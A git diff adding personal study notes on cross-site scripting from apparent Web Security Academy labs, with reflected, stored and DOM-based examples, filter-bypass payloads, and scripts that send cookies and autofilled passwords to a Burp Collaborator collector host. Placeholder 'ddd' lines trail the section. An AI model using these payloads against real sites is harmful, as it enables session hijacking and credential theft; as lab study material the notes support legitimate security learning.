@@ -2132,7 +2132,6 @@ Content-Type: application/json
 - `X-Frame-Options: allow-from https://normal-website.com`
 - `Content-Security-Policy: frame-ancestors 'self';` or none
 - `Content-Security-Policy: frame-ancestors normal-website.com;`
-- 
 
 ### Clickjacking Lab
 - **Basic clickjacking** with CSRF token protection	
@@ -2195,9 +2194,203 @@ Content-Type: application/json
 
 ## XSS (Cross-Site Scripting)
 **types of XSS attacks**
-- 
+- Reflected
+  - From current HTTP request
+  - An application receives data in an HTTP request and includes that data within the immediate response in an unsafe way
+    ```
+    https://insecure-website.com/status?message=All+is+well.
+    <p>Status: All is well.</p>
+    
+    https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
+    <p>Status: <script>/* Bad stuff here... */</script></p>
+    ```
+- Stored
+  - From database (users submit messages)
+    ```
+    POST /post/comment HTTP/1.1
+    Host: vulnerable-website.com
+    Content-Length: 100
+	
+    postId=3&comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E&name=Carlos+Montoya&email=carlos%40normal-user.net
 
+    <p><script>/* Bad stuff here... */</script></p>
+    ```
+- DOM-based
+  - Exists in client-side code rather than server-side code
+    ```
+    var search = document.getElementById('search').value;
+    var results = document.getElementById('results');
+    results.innerHTML = 'You searched for: ' + search;
+    ```
+**XSS impacts**
+- capture credential/cookies > Impersonate user > carry out user's action > read data/deface website
+- inject trojan functionality
+
+**How to find and test for XSS**
+- Test every entry point (URL, message body, HTTP headers)
+- Submit random alphanumeric values to see if the value is reflected in the response
+- Determine the reflection context (text between HTML tag, tag attribute, JavaScript string)
+- Use Burp Repeater to test a candidate payload > if payload is modified or blocked > test alternative payloads	> Test the attack in a browser
+  
 ### XSS Lab
+**XSS between HTML tags**
+- **Reflected** XSS into HTML context with **nothing encoded**	
+  **search box**: `<h1>0 search results for '<script>alert(1)</script>'</h1>`
+- **Stored** XSS into HTML context with **nothing encoded**
+  **post comment**: `<script>alert(1)</script>`
+- Reflected XSS into HTML context with most **tags and attributes blocked**
+  - `<img src=1 onerror=print()>` > Error "**tag** is not allowed"  	
+  - iterate and find a working tag html element  
+    GET /?search=<§§>  
+    [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) click button "Copy tags to clipboard"  
+    Found 200 response: body  
+  - `<body onload=print()>` > Error "**attribute** is not allowed"  		
+  - iterate and find a working attribute  
+    GET /?search=<body%20§§=1>  
+     [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) click button "Copy events to clipboard"  
+    Found 200 response: onresize,....  
+  - Deliver exploit `><body onresize=print()>`  
+    `<iframe src="https://0a3d00fc042cd7f58369c88600d00092.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`  
+- Reflected XSS into HTML context with **all tags blocked except custom ones**
+  - This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called.
+  - `><body onresize=print()><script> location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';</script>`
+  - Exploit server payload	
+    ```
+    <script>
+	location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+    </script>
+    ```
+- Reflected XSS with **event handlers and href attributes blocked (Expert)**
+  - you need to **label your vector with the word "Click"** in order to induce the simulated lab user to click your vector
+  - Input `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>`  
+    http://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
+- Reflected XSS with some **SVG markup** allowed
+  - iterate and find a working tag html element <§§> : <svg>, <animatetransform>, <title>, and <image>
+  - iterate and find a working attribute <svg><animatetransform%20§§=1> : onbegin
+  - Input `><svg><animatetransform onbegin=alert(1)>`   
+    https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
+
+**XSS in HTML tag attributes**
+- Reflected XSS into **attribute with angle brackets** HTML-encoded
+  - Test `he123"` <input type="text" placeholder="Search the blog..." name="search" `value="he123" "=""`>	
+  - `"onmouseover="alert(1)` >	`<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)">`
+- Stored XSS into anchor **href attribute with double quotes** HTML-encoded
+  - <a id="author" `href="www.attacker1.com"`>attacker</a>
+  - in website field, input `javascript:alert(1)` > `<a id="author" href="javascript:alert(1)">yuyu</a>`
+- Reflected XSS in canonical **link** tag
+  - Page source: <link rel="canonical" href='https://0a4b00e3035d840580ef6c4c005c00d6.web-security-academy.net/?hello'/>
+  - rel="canonical": Indicates that the link is the canonical (authoritative) URL for the page.
+  - `%27` = `'`	
+  - browse `'accesskey='x'onclick='alert(1)`	
+    `https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)'
+  - trigger the shortcut key on windows: `ALT+SHIFT+X`
+
+**XSS into JavaScript**
+- Reflected XSS into a JavaScript string with **single quote and backslash escaped**
+  - **Terminating the existing script** `</script><img src=1 onerror=alert(document.domain)>`
+    ```
+    <script>
+	...
+	var input = 'controllable data here';
+	...
+    </script>
+    ```
+  - Test bad input
+    ```
+    single' backslash\' >  var searchTerms = 'single\' backslash\\\'';
+    ```
+  - break out of the script block and inject a new script
+    `</script><script>alert(1)</script>`
+- Reflected XSS into a JavaScript string with **angle brackets HTML encoded**
+  - Test bad input
+    ```
+    angle <> > var searchTerms = 'angle &lt;&gt;';
+    ```
+  - Breaking out of a JavaScript string
+  - Input `'-alert(1)-'`, XSS success `var searchTerms = ''-alert(1)-'';`
+- Reflected XSS into a JavaScript string with **angle brackets and double quotes HTML-encoded** and **single quotes escaped**
+  - Test bad input
+    ```
+    hello<> > var searchTerms = 'hello&lt;&gt;';
+    hello" >  var searchTerms = 'hello&quot;';
+    hello' >  var searchTerms = 'hello\'';  
+    ```
+  - break out of the JavaScript string and inject an alert
+    `\'-alert(1)//` > `var searchTerms = '\\'-alert(1)//';`
+  - the **single quote** (') ends a string in JavaScript prematurely, and **alert(1)** is then executed as a separate command. The **//** part is used to comment out the rest of the JavaScript line
+- Reflected XSS in a JavaScript URL with some characters blocked
+  - `postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`
+  - `27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`
+    - %27 is the URL-encoded version of the single quote ('), used to prematurely close a string or break out of a specific context	
+  - Initial Parameter Injection: `%27`
+  - Starting a New JavaScript Statement: `},x=x=%3E{...}`
+    - This begins an object destructuring assignment, where x is being defined as a function with the arrow function syntax x => {...}	
+  - Throwing an Error and Defining an onerror Handler: `throw/**/onerror=alert,1337`
+    - triggers the onerror event handler
+  - Overriding `toString: toString=x`
+  - Coercing window to a String: `window%2b%27%27`
+  - Ending the Payload: `{x:%27`
+- Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped. 
+
+**Client-side template injection**
+- Exploiting cross-site scripting to **steal cookies**
+  - limitation: user not logged in, HttpOnly flag, block user IP, session time out	
+  - Post comment and capture the session value in Burp Collaborator
+  ```
+  <script>
+	fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+	method: 'POST',
+	mode: 'no-cors',
+	body:document.cookie
+	});
+  </script>
+  ```
+- Exploiting cross-site scripting to **capture passwords**	
+  - Target password manager that performs **password auto-fill**	
+  - Post comment and capture the password value in Burp Collaborator
+  ```
+  <input name=username id=username>
+  <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+	method:'POST',
+	mode: 'no-cors',
+	body:username.value+':'+this.value
+	});">
+  ```
+- Exploiting XSS to perform **CSRF**
+  - Extract the CSRF token and change the victim's email address
+  - Post comment > who views the comment issue a POST request to change their email address to test@test.com	
+  ```
+  Repeater
+  POST /my-account/change-email
+  email=test%40normal-user.net&csrf=ZqNZdY3eSqvBYHiuBgDUiRAkX3OJ0Xw0
+  
+  <script>
+	var req = new XMLHttpRequest();
+	req.onload = handleResponse;
+	req.open('get','/my-account',true);
+	req.send();
+	function handleResponse() {
+	    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+	    var changeReq = new XMLHttpRequest();
+	    changeReq.open('post', '/my-account/change-email', true);
+	    changeReq.send('csrf='+token+'&email=test@test.com')
+	};
+  </script>
+  ```
+
+
+- ddd
+- ddd
+- ddd
+- ddd
+- ddd
+- ddd
+- ddd
+- ddd
+- ddd
+- ddd
+- ddd
+- ddd
 
 ## DOM-based Attacks
 Details about DOM-based attacks...
